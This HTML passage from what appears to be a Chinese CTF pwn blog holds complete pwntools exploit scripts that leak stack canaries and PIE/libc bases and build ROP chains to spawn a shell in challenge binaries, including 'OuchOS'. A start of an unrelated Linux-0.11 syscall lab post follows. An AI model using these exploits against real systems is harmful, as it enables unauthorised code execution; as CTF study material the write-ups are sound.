class="string">&quot;5&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;new status&quot;</span>,status)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">msg</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;Message&quot;</span>,msg)</span><br><span class="line"></span><br><span class="line">register(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">register(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">register(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(<span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;new status: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x4aa429</span> + <span class="number">729088</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">choose(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">send(<span class="string">&quot;a&quot;</span>*<span class="number">0x200</span>+<span class="string">&quot;b&quot;</span>*<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;b&quot;</span>*<span class="number">9</span>)</span><br><span class="line">leak_addr = (ru(<span class="string">&quot;is&quot;</span>)[:<span class="number">7</span>])</span><br><span class="line">leak_addr = u64(leak_addr.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">canary = leak_addr * <span class="number">0x100</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x200</span>+<span class="string">&quot;b&quot;</span>*<span class="number">8</span>+<span class="string">&quot;c&quot;</span>*<span class="number">8</span></span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;c&quot;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">leak_addr = u64(leak_addr.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0xb080</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0B040</span> + pro_base +<span class="number">0x200</span></span><br><span class="line">main_addr = <span class="number">0x3B36</span> + pro_base</span><br><span class="line">success(<span class="string">&quot;bss_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">2</span>]+libc_base</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000006403</span> + pro_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000006401</span> + pro_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000036174</span> + libc_base</span><br><span class="line">syscall_ret = <span class="number">0x0000000000120069</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x000000000002284d</span> + libc_base</span><br><span class="line"></span><br><span class="line">write_libc = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">puts_libc = libc_base + libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">open_libc = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">open_plt = pro_base + <span class="number">0x2580</span></span><br><span class="line">open_got = pro_base + <span class="number">0xAF78</span></span><br><span class="line">read_libc = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">execve_libc = libc_base + libc.sym[<span class="string">&quot;execve&quot;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line">success(<span class="string">&quot;binsh &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x200</span>+<span class="string">&quot;b&quot;</span>*<span class="number">8</span>+p64(canary)+<span class="string">&quot;c&quot;</span>*<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system_libc)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(bss_addr)+p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(0x60)</span></span><br><span class="line"><span class="string">payload += p64(syscall_ret)</span></span><br><span class="line"><span class="string"># open(bss_addr,0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(2)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(bss_addr)</span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(0)+p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(syscall_ret)</span></span><br><span class="line"><span class="string"># read(3,bss_addr,0x60)</span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(3)</span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(bss_addr)+p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(0x60)</span></span><br><span class="line"><span class="string">payload += p64(syscall_ret)</span></span><br><span class="line"><span class="string"># write(1,bss_addr,0x60)</span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(1)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(1)</span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(bss_addr)+p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(0x60)</span></span><br><span class="line"><span class="string">payload += p64(syscall_ret)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">send(payload)</span><br><span class="line">sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;666&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p.recv(1)</span></span><br><span class="line"><span class="string">leak_addr = p.recv(6)</span></span><br><span class="line"><span class="string">leak_addr = u64(leak_addr.ljust(8,&quot;\x00&quot;))</span></span><br><span class="line"><span class="string">success(&quot;leak_addr &gt;&gt; &quot;+hex(leak_addr))</span></span><br><span class="line"><span class="string">success(&quot;offset &gt;&gt; &quot;+hex(leak_addr-libc_base))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x136420</span></span><br><span class="line"><span class="comment">#0x84420</span></span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line"><span class="comment">#p.send(&quot;flag&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="OuchOS"><a href="#OuchOS" class="headerlink" title="OuchOS"></a>OuchOS</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OuchOS1: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter ./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">17</span>c82d26ae3109262c4fe4584f0c85bcc2132b9f, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">len = <span class="built_in">std</span>::<span class="built_in">string</span>::length(input);</span><br><span class="line">v7 = (<span class="keyword">const</span> <span class="keyword">void</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str(input);</span><br><span class="line"><span class="built_in">memcpy</span>(dest, v7, len);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用栈溢出覆盖 canary 低位可以泄露 canary 和其后的 pro_addr 返回地址</p>
<p>然后先构造一个 <code>getline(cin,bss_addr)</code> 写入 <code>/bin/sh\x00</code>，然后构造 system 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./OuchOS1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;175.22.1.66&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x5be3)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&quot;login:&quot;</span>,<span class="string">&quot;ctf&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Password&quot;</span>,<span class="string">&quot;ctf123456&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;sudo do&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">1024</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x9</span></span><br><span class="line">sla(<span class="string">&quot;ctf&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;bbbbbbbbb&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">canary = leak_addr * <span class="number">0x100</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0xa6e7</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = pro_base + <span class="number">0x0000000000009d73</span></span><br><span class="line">pop_rsi_ret = pro_base + <span class="number">0x0000000000009d71</span></span><br><span class="line">ret = pro_base + <span class="number">0x000000000000301a</span></span><br><span class="line">system = pro_base + <span class="number">0x0000000000003630</span></span><br><span class="line">cin = pro_base + <span class="number">0xf1c0</span></span><br><span class="line">getline = pro_base + <span class="number">0x3480</span></span><br><span class="line"></span><br><span class="line">bss_addr = pro_base + <span class="number">0xf040</span>+<span class="number">0x120</span>+<span class="number">0x138</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">1024</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>+p64(canary)+<span class="string">&quot;c&quot;</span>*<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(cin)+p64(pop_rsi_ret)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(getline)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(pro_base+<span class="number">0xf210</span>)+p64(ret) +p64(system)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;ctf&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;r0o7654321&quot;</span></span><br><span class="line">sla(<span class="string">&quot;ctf&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sla(&quot;login:&quot;,&quot;root&quot;)</span></span><br><span class="line"><span class="comment">#sla(&quot;Password&quot;,&quot;r0o7654321&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/20/HIT-OSLab2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/HIT-OSLab2/" class="post-title-link" itemprop="url">HIT-OSLab2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-20 22:56:32 / Modified: 22:57:20" itemprop="dateCreated datePublished" datetime="2023-10-20T22:56:32+08:00">2023-10-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>HIT-OSLab2</strong></p>
<p>实验目标：在 Linux-0.11 上添加两个系统调用：（原始只有72个系统调用）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">iam</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * name)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>将 <code>name</code> 中存放的字符串拷贝到内核中并保存下来，要求 <code>name</code> 的长度不能超过 23 个字符，若超过了，返回 -1 并置 <code>errno</code> 为 <code>EINVAL</code>，如果没有超过就返回拷贝的字符个数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">whoami</span><span class="params">(<span class="keyword">char</span> * name,<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>将内核中存放的字符串（由 <code>iam</code> 拷贝进去的）重新复制到 <code>name</code> 中，<code>size</code> 是指 <code>name</code> 指向的内存空间允许存放的最大长度，如果 <code>size</code> 小于需要的空间，就返回 -1，并置 <code>errno</code> 为 <code>EINVAL</code>，否则返回拷贝的字节数</li>
</ul>
<p><strong>实验过程</strong></p>
<p>系统调用执行的详细过程如下：</p>
<ul>
<li>调用中断处理程序：当进程需要执行系统调用时，进程会主动调用中断处理程序 interrupt handler</li>
<li>保存现场信息：中断处理程序会保存当前进程的寄存器值到堆栈中，以便在系统调用结束后恢复进程状态</li>
<li>切换控制权：将 CPU 控制权交给操作系统,操作系统开始处理系统调用请求</li>
<li>解析系统调用请求：操作系统根据系统调用请求的代码指针等信息，解析出需要调用的系统服务函数的地址</li>
<li>调用系统服务函数：操作系统将解析出的系统服务函数地址作为参数，调用系统服务函数执行系统调用请求</li>
<li>处理系统调用结果：系统服务函数处理完系统调用请求后，会将结果返回给操作系统</li>
<li>恢复现场信息：操作系统将保存的寄存器值从堆栈中取出，恢复当前进程的原始状态</li>
<li>切换控制权：操作系统将 CPU 控制权还给进程，进程继续执行</li>
</ul>
<p>在代码层中的实现如下：</p>
<ul>
<li>把系统调用的编号存入 ax</li>
<li>把函数参数存入其他通用寄存器</li>
<li>触发 0x80 中断（<code>int 0x80</code>）</li>
</ul>
<p>在 linux-0.11 中，系统调用的源码存放在两处地方：</p>
<ul>
<li><code>linux-0.11/lib/</code></li>
<li><code>linux-0.11/kernel/</code>（实验要求我们把文件放入这里）</li>
</ul>
<p>在系统调用中用户态程序不能直接和内核态程序交换数据，必须使用内核提供的 API，在 linux-0.11 中的 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">get_fs_byte</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">register</span> <span class="keyword">char</span> _v;</span><br><span class="line"></span><br><span class="line">	__asm__ (<span class="string">&quot;movb %%fs:%1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span> (_v):<span class="string">&quot;m&quot;</span> (*addr));</span><br><span class="line">	<span class="keyword">return</span> _v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">get_fs_word</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> _v;</span><br><span class="line"></span><br><span class="line">	__asm__ (<span class="string">&quot;movw %%fs:%1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span> (_v):<span class="string">&quot;m&quot;</span> (*addr));</span><br><span class="line">	<span class="keyword">return</span> _v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_fs_long</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> _v;</span><br><span class="line"></span><br><span class="line">	__asm__ (<span class="string">&quot;movl %%fs:%1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span> (_v):<span class="string">&quot;m&quot;</span> (*addr)); \</span><br><span class="line">	<span class="keyword">return</span> _v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">put_fs_byte</span><span class="params">(<span class="keyword">char</span> val,<span class="keyword">char</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm__ (<span class="string">&quot;movb %0,%%fs:%1&quot;</span>::<span class="string">&quot;r&quot;</span> (val),<span class="string">&quot;m&quot;</span> (*addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">put_fs_word</span><span class="params">(<span class="keyword">short</span> val,<span class="keyword">short</span> * addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm__ (<span class="string">&quot;movw %0,%%fs:%1&quot;</span>::<span class="string">&quot;r&quot;</span> (val),<span class="string">&quot;m&quot;</span> (*addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">put_fs_long</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> val,<span class="keyword">unsigned</span> <span class="keyword">long</span> * addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm__ (<span class="string">&quot;movl %0,%%fs:%1&quot;</span>::<span class="string">&quot;r&quot;</span> (val),<span class="string">&quot;m&quot;</span> (*addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Someone who knows GNU asm better than I should double check the followig.</span></span><br><span class="line"><span class="comment"> * It seems to work, but I don&#x27;t know if I&#x27;m doing something subtly wrong.</span></span><br><span class="line"><span class="comment"> * --- TYT, 11/24/91</span></span><br><span 